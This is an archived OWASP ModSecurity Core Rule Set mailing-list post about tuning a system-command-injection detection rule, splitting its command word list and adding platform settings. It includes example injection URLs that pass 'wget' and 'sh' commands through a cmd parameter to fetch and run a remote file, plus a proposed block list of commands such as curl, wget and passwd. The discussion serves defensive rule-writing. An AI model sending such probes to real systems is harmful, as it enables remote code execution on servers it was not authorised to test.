<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<HTML>
 <HEAD>
   <TITLE> [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial	candidate 950907 / 932100 (System command injection)
   </TITLE>
   <LINK REL="Index" HREF="index.html" >
   <LINK REL="made" HREF="mailto:owasp-modsecurity-core-rule-set%40lists.owasp.org?Subject=Re%3A%20%5BOwasp-modsecurity-core-rule-set%5D%20Paranoia%20Mode%3A%20Controversial%0A%09candidate%20950907%20/%20932100%20%28System%20command%20injection%29&In-Reply-To=%3C69CE0D94-2054-443C-8336-033DCCB33934%40spam.lifeforms.nl%3E">
   <META NAME="robots" CONTENT="index,nofollow">
   <style type="text/css">
       pre {
           white-space: pre-wrap;       /* css-2.1, curent FF, Opera, Safari */
           }
   </style>
   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
   <LINK REL="Previous"  HREF="001927.html">
   <LINK REL="Next"  HREF="001908.html">
 </HEAD>
 <BODY BGCOLOR="#ffffff">
   <H1>[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial	candidate 950907 / 932100 (System command injection)</H1>
    <B>Walter Hop</B> 
    <A HREF="mailto:owasp-modsecurity-core-rule-set%40lists.owasp.org?Subject=Re%3A%20%5BOwasp-modsecurity-core-rule-set%5D%20Paranoia%20Mode%3A%20Controversial%0A%09candidate%20950907%20/%20932100%20%28System%20command%20injection%29&In-Reply-To=%3C69CE0D94-2054-443C-8336-033DCCB33934%40spam.lifeforms.nl%3E"
       TITLE="[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial	candidate 950907 / 932100 (System command injection)">modsec at spam.lifeforms.nl
       </A><BR>
    <I>Sat Feb  6 22:04:00 UTC 2016</I>
    <P><UL>
        <LI>Previous message: <A HREF="001927.html">[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)
</A></li>
        <LI>Next message: <A HREF="001908.html">[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#1900">[ date ]</a>
              <a href="thread.html#1900">[ thread ]</a>
              <a href="subject.html#1900">[ subject ]</a>
              <a href="author.html#1900">[ author ]</a>
         </LI>
       </UL>
    <HR>  
<!--beginarticle-->
<PRE>
&gt;<i> On 02 Feb 2016, at 09:17, Christian Folini &lt;<A HREF="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">christian.folini at netnea.com</A>&gt; wrote:
</I>&gt;<i> 
</I>&gt;<i> Controversial Paranoia Mode Candidate 950907 (2.2.X) / 932100 (3.0.0rc1)
</I>&gt;<i> msg: Sytem Command Injection
</I>&gt;<i> 
</I>&gt;<i> [&#8230;]
</I>&gt;<i> This rule is controversial for different reasons than the one in the previous post.
</I>&gt;<i> 
</I>&gt;<i> It was a simple regex in 2.2.X. For 3.0.0 it has been enriched with a
</I>&gt;<i> data file:
</I>&gt;<i> <A HREF="https://raw.githubusercontent.com/SpiderLabs/owasp-modsecurity-crs/v3.0.0-rc1/rules/os-commands.data">https://raw.githubusercontent.com/SpiderLabs/owasp-modsecurity-crs/v3.0.0-rc1/rules/os-commands.data</A>
</I>&gt;<i> 
</I>&gt;<i> In a response to my blogpost 
</I>&gt;<i> <A HREF="https://www.netnea.com/cms/2015/12/20/modsec-crs-2-2-x-vs-3-0-0-dev/">https://www.netnea.com/cms/2015/12/20/modsec-crs-2-2-x-vs-3-0-0-dev/</A>
</I>&gt;<i> Chaim conceded the 3.0.0 version is still plagued by a lot of false
</I>&gt;<i> positives. Obviously so, if you look at the commands. After all, unix
</I>&gt;<i> commands are close to natural English for a good reason.
</I>&gt;<i> 
</I>&gt;<i> Now Franziska (collaborating on the paranoia mode) and I wonder if 
</I>&gt;<i> it would not make sense to split
</I>&gt;<i> os-commands.data into two or more files. The commands with few
</I>&gt;<i> false positives would remain in the standard file, commands generating
</I>&gt;<i> lots of false positives could then be moved into
</I>&gt;<i> os-commands-paranoia.data and be referenced in a separate rule
</I>&gt;<i> copying the behaviour of the standard rule.
</I>&gt;<i> 
</I>&gt;<i> Thoughts?
</I>
I like the idea of splitting the file.

Overall I'm not satisfied with this new rule yet. I think the regexp needs some love too.

I agree some of the words in os-commands.data seem rather paranoid. Words like &quot;choice&quot;, &quot;help&quot;, &quot;now&#8221; seem of low value and are common in natural text. Also, the large number of Unix-only environments could skip Windows related commands. It&#8217;s hard for users to modify these lists as you&#8217;d have to hack the CRS, and these huge collections are to maintain anyhow, so I agree we need granularity.

The rule has some regexp magic to prevent false positives, but the balance is not a complete success in my opinion. For instance, the following URLs don't trigger in CRSv3:
<A HREF="http://vuln/?cmd=wget%20http://example.com/blah.txt">http://vuln/?cmd=wget%20http://example.com/blah.txt</A>
<A HREF="http://vuln/?cmd=sh%20blah.txt">http://vuln/?cmd=sh%20blah.txt</A>

So it's not as strong as you would want either to prevent some common RCE.
Something like <A HREF="http://vuln/?cmd=Wget%20http://example.com/;%20ecHo">http://vuln/?cmd=Wget%20http://example.com/;%20ecHo</A> does trigger it.

My ideas about this:

1) I think that a user should check their desired platforms in the setup conf. In fact, this would be great to do anyway in the initial 3.0.0 release even if we DON'T look at it in any rule yet. Specifying platform types will pave the way for reducing false positives and false negatives by skipping unnecessary checks and being more strict on the right platforms. So we could start by listing these platforms in the existing rule in the setup conf. Example:

	SecAction \
	  &quot;id:'900024', \
	  phase:1, \
	  t:none, \
	  setvar:tx.unix=1, \
	  setvar:tx.windows=1, \
	  setvar:tx.java=1, \
	  setvar:tx.php=1, \
	  ...

(By the way: I think it&#8217;s unfortunate that a user has to use value 1 to enable a check. An undefined variable will mean that the CRS will skip some rules. This makes it dangerous to introduce a new variable in the CRS later; all existing installations MUST then add this variable to their setup rule immediately, or suffer from reduced security. It&#8217;s better to use a scheme that defaults to &#8220;on&#8221;. A convention like &#8220;tx.disable_mysql=1&#8221; would be user unfriendly and error-prone. But we could check for an explicit &#8220;off&#8221; string, e.g. &#8220;setvar:tx.mysql=off&#8221;. If it&#8217;s not &#8220;off&#8221; then assume that the user DOES want the check. I think it&#8217;s important to get this right in 3.0.0, it will be more painful to do it later.)

2) Separate the words into multiple lists:
	os-commands-critical.data (absolute red flag list: &quot;curl&quot;, &quot;passwd&quot;, &quot;sh&quot;, &quot;uname&quot;, &quot;wget&quot; etc.)
	os-commands-paranoid.data (absolute low value, but high FP natural words like &quot;choice&quot;)
	os-commands-windows.data (all Windows commands)
	os-commands-common.data (all other commands)

3) Review the current regexp against some test data and CRSv2 to make it more sensitive

4) Split the rule as follows:

- &quot;os-commands-critical.data&quot;: should be checked super strictly with a simple regexp and produce a critical score. My two example commands should definitely be blocked.
- &quot;os-commands-windows.data&quot;: use current algorithm, but only run this rule if the user is interested in Windows. (The inverse is probably not useful: a Windows system can have typical unix-like &quot;wget&quot; or &quot;curl&quot; binaries, so I think &quot;os-commands-unix.data&quot; is probably not wise to have.)
- &quot;os-commands-common.data&quot;: use current algorithm
- &quot;os-commands-paranoid.data&quot;: use current algorithm, paranoid mode only.

-- 
Walter Hop | PGP key: <A HREF="https://lifeforms.nl/pgp">https://lifeforms.nl/pgp</A>

-------------- next part --------------
An HTML attachment was scrubbed...
URL: &lt;<A HREF="http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160206/53b67199/attachment.html">http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160206/53b67199/attachment.html</A>&gt;
</PRE>
























<!--endarticle-->
    <HR>
    <P><UL>
        <!--threads-->
	<LI>Previous message: <A HREF="001927.html">[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)
</A></li>
	<LI>Next message: <A HREF="001908.html">[Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial candidate 950907 / 932100 (System command injection)
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#1900">[ date ]</a>
              <a href="thread.html#1900">[ thread ]</a>
              <a href="subject.html#1900">[ subject ]</a>
              <a href="author.html#1900">[ author ]</a>
         </LI>
       </UL>

<hr>
<a href="https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set">More information about the Owasp-modsecurity-core-rule-set
mailing list</a><br>
</body></html>
